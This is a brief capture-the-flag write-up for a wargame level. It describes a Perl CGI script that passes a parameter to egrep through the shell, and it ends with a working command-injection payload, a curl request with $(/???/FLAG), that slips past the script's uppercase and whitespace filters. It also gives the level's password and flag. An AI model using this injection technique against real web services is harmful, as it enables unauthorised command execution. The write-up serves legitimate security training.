username: level12  
password: fa6v5ateaw21peobuub8ipe6s
---

HTTP server listening on port 4646, it uses `/var/www/level12/level12.pl` as index.

Apache configuration

```
$ cat /etc/apache2/sites-available/level12.conf 
```

`level12.pl` takes two parameters x and y and apply to filters on x:

* `$xx =~ tr/a-z/A-Z/;` : change all lowercase letters to uppercase
* `$xx =~ s/\s.*//;` : removes everything from the first white space it encounters

Then it passes `$xx` to `egrep` command which is being executed on the system shell.

To get the flag run the following

```
echo 'getflag > /tmp/flg' > /tmp/FLAG && chmod +x /tmp/FLAG
curl 'http://localhost:4646?x=$(/???/FLAG),y=1' && cat /tmp/flg
```

The flag is: g1qKMiRpXf53AWhDaU7FEkczr
